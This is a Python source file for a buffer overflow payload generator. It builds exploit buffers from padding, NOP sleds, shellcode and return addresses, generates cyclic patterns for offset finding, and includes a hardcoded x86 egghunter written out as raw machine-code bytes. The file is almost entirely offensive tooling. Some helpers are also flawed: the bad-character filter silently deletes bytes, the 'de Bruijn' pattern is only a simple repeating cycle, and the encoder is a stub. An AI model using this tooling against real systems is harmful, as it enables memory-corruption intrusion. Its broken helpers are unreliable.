"""Buffer Overflow Payload Generator."""

import struct
from typing import List, Optional


class BufferOverflowGenerator:
    """Generate buffer overflow exploits with various features."""

    def __init__(self):
        """Initialize generator."""
        self._pattern = None

    def generate(
        self,
        offset: int,
        shellcode: bytes,
        bad_chars: Optional[List[bytes]] = None,
        return_address: Optional[bytes] = None,
        nop_sled_size: int = 100,
        padding_char: bytes = b"A"
    ) -> bytes:
        """Generate buffer overflow payload.

        Args:
            offset: Offset to return address
            shellcode: Shellcode bytes
            bad_chars: List of bad characters to avoid
            return_address: Return address (4 bytes, little-endian)
            nop_sled_size: Size of NOP sled
            padding_char: Padding character

        Returns:
            Complete buffer overflow payload
        """
        # Validate inputs
        if len(padding_char) != 1:
            raise ValueError("Padding char must be single byte")

        # Build payload components
        payload = b""

        # Calculate padding size
        total_prefix = nop_sled_size + len(shellcode)
        if total_prefix >= offset:
            # Shellcode + NOP sled is longer than offset, adjust
            nop_sled_size = max(0, offset - len(shellcode) - 4)
            padding_size = 0
        else:
            padding_size = offset - total_prefix

        # Add padding
        if padding_size > 0:
            if bad_chars and padding_char in bad_chars:
                # Use alternative padding
                padding_char = b"B"
            payload += padding_char * padding_size

        # Add NOP sled
        if nop_sled_size > 0:
            nop = b"\x90"
            if bad_chars and nop in bad_chars:
                # Use alternative NOP (inc eax, dec eax)
                nop = b"\x40\x48"
            payload += nop * (nop_sled_size // len(nop))

        # Add shellcode
        payload += shellcode

        # Add return address
        if return_address:
            payload += return_address
        else:
            # Default return address (0x41424344 = "ABCD")
            payload += b"\x44\x43\x42\x41"  # Little-endian

        return payload

    def generate_pattern(self, size: int) -> bytes:
        """Generate cyclic pattern (de Bruijn sequence).

        Args:
            size: Pattern size

        Returns:
            Cyclic pattern
        """
        alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        pattern = b""

        # Simple cyclic pattern: Aa0Aa1Aa2...
        upper = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        lower = b"abcdefghijklmnopqrstuvwxyz"
        digits = b"0123456789"

        i = 0
        while len(pattern) < size:
            pattern += bytes([upper[i % len(upper)]])
            if len(pattern) >= size:
                break
            pattern += bytes([lower[i % len(lower)]])
            if len(pattern) >= size:
                break
            pattern += bytes([digits[i % len(digits)]])
            i += 1

        self._pattern = pattern[:size]
        return self._pattern

    def find_offset(self, sequence: bytes) -> int:
        """Find offset of sequence in last generated pattern.

        Args:
            sequence: 4-byte sequence to find

        Returns:
            Offset or -1 if not found
        """
        if not self._pattern:
            # Generate default pattern
            self.generate_pattern(10000)

        try:
            return self._pattern.index(sequence)
        except ValueError:
            return -1

    def filter_bad_chars(self, payload: bytes, bad_chars: List[bytes]) -> bytes:
        """Remove bad characters from payload.

        Args:
            payload: Original payload
            bad_chars: List of bad characters (single bytes)

        Returns:
            Filtered payload
        """
        filtered = payload
        for bad_char in bad_chars:
            if len(bad_char) == 1:
                # Replace with safe character
                filtered = filtered.replace(bad_char, b"")

        return filtered

    def encode_shellcode(
        self,
        shellcode: bytes,
        bad_chars: List[bytes]
    ) -> Optional[bytes]:
        """Encode shellcode to avoid bad characters.

        Note: Basic implementation. Real encoders use alpha-numeric, XOR, etc.

        Args:
            shellcode: Original shellcode
            bad_chars: Bad characters to avoid

        Returns:
            Encoded shellcode or None if encoding not possible
        """
        # Check if encoding is needed
        needs_encoding = any(bad_char in shellcode for bad_char in bad_chars)

        if not needs_encoding:
            return shellcode

        # Simple XOR encoding (real implementations would be more sophisticated)
        # This is a placeholder - real shellcode encoding is complex
        # For now, return None to indicate we can't encode it
        return None

    def validate_shellcode(
        self,
        shellcode: bytes,
        bad_chars: Optional[List[bytes]] = None
    ) -> bool:
        """Validate shellcode against bad characters.

        Args:
            shellcode: Shellcode to validate
            bad_chars: Bad characters to check

        Returns:
            True if shellcode is valid
        """
        if not shellcode:
            return False

        if bad_chars:
            for bad_char in bad_chars:
                if bad_char in shellcode:
                    return False

        return True

    def reverse_endian(self, data: bytes) -> bytes:
        """Reverse endianness of data.

        Args:
            data: Bytes to reverse

        Returns:
            Reversed bytes
        """
        return data[::-1]

    def generate_ret_sled(self, size: int) -> bytes:
        """Generate RET sled for chaining.

        Args:
            size: Sled size in bytes

        Returns:
            RET sled
        """
        ret_instruction = b"\xc3"
        return ret_instruction * size

    def align_shellcode(self, shellcode: bytes, alignment: int = 4) -> bytes:
        """Align shellcode to specified boundary.

        Args:
            shellcode: Original shellcode
            alignment: Alignment boundary (4, 8, 16, etc.)

        Returns:
            Aligned shellcode
        """
        remainder = len(shellcode) % alignment
        if remainder == 0:
            return shellcode

        # Add NOP padding
        padding_size = alignment - remainder
        return shellcode + (b"\x90" * padding_size)

    def generate_egghunter(self, tag: bytes = b"w00t") -> bytes:
        """Generate egghunter for limited buffer space.

        Egghunter searches memory for a tag and executes shellcode after it.

        Args:
            tag: 4-byte tag to search for

        Returns:
            Egghunter shellcode (small, ~32 bytes)
        """
        if len(tag) != 4:
            # Duplicate to make 8 bytes (tag appears twice)
            tag = tag[:4]

        # Simple x86 egghunter (simplified version)
        # Real egghunters use SEH or other techniques
        # This is a basic example
        egghunter = b""
        egghunter += b"\x66\x81\xca\xff\x0f"  # or dx, 0x0fff
        egghunter += b"\x42"                  # inc edx
        egghunter += b"\x52"                  # push edx
        egghunter += b"\x6a\x02"              # push 2
        egghunter += b"\x58"                  # pop eax
        egghunter += b"\xcd\x2e"              # int 0x2e
        egghunter += b"\x3c\x05"              # cmp al, 5
        egghunter += b"\x5a"                  # pop edx
        egghunter += b"\x74\xef"              # je short (loop)
        egghunter += b"\xb8" + tag            # mov eax, tag
        egghunter += b"\x8b\xfa"              # mov edi, edx
        egghunter += b"\xaf"                  # scasd
        egghunter += b"\x75\xea"              # jne short (loop)
        egghunter += b"\xaf"                  # scasd (check second tag)
        egghunter += b"\x75\xe7"              # jne short (loop)
        egghunter += b"\xff\xe7"              # jmp edi (execute shellcode)

        return egghunter
